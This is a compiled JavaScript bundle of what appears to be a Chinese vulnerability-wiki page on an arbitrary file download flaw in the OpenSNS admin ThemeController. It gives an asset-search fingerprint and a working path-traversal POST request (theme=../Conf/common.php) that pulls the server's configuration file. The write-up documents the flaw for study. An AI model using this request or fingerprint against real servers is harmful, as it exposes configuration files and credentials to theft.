{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[67],{1725:function(t,a,s){\"use strict\";s.r(a);var e=s(56),r=Object(e.a)({},(function(){var t=this,a=t.$createElement,e=t._self._c||a;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"opensns-themecontroller-class-php-后台任意文件下载漏洞\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#opensns-themecontroller-class-php-后台任意文件下载漏洞\"}},[t._v(\"#\")]),t._v(\" OpenSNS ThemeController.class.php 后台任意文件下载漏洞\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞描述\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),e(\"p\",[t._v(\"OpenSNS ThemeController.class.php文件中存在文件下载，其中过滤不足导致可以下载服务器任意文件\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞影响\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[t._v(\"#\")]),t._v(\" 漏洞影响\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"OpenSNS\")]),e(\"br\"),t._v(\" \"),e(\"h2\",{attrs:{id:\"网络测绘\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[t._v(\"#\")]),t._v(\" 网络测绘\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v('icon_hash=\"1167011145\"')]),e(\"br\"),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞复现\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),e(\"p\",[t._v(\"登录页面如下\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(569),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"存在漏洞的文件为 \"),e(\"strong\",[t._v(\"Application/Admin/Model/ThemeController.class.php\")])]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(570),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"其中 theme参数为用户可控参数，根据函数流程可以发现存在的文件将会打包为 zip文件提供下载\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(571),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"构造请求\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-php extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token constant\"}},[t._v(\"POST\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"admin\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),t._v(\"php\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"?\")]),t._v(\"s\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"theme\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"packageDownload\\n\\ntheme\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"Conf\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"common\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),t._v(\"php\\n\")])])]),e(\"p\",[e(\"img\",{attrs:{src:s(572),alt:\"img\"}})])],1)}),[],!1,null,null,null);a.default=r.exports},569:function(t,a,s){t.exports=s.p+\"assets/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235703575.af5bef0e.png\"},570:function(t,a,s){t.exports=s.p+\"assets/img/1634373152099-96ada529-b284-4aae-9a04-877693d8cfbf.bab0d11c.png\"},571:function(t,a,s){t.exports=s.p+\"assets/img/1634373562017-e7805233-165a-4e99-b12b-9ef7d0be3508.c1bf7023.png\"},572:function(t,a,s){t.exports=s.p+\"assets/img/1634374149802-424a321a-71f3-404a-9397-9a1f3085b9f3.95584654.png\"}}]);","extractedComments":[]}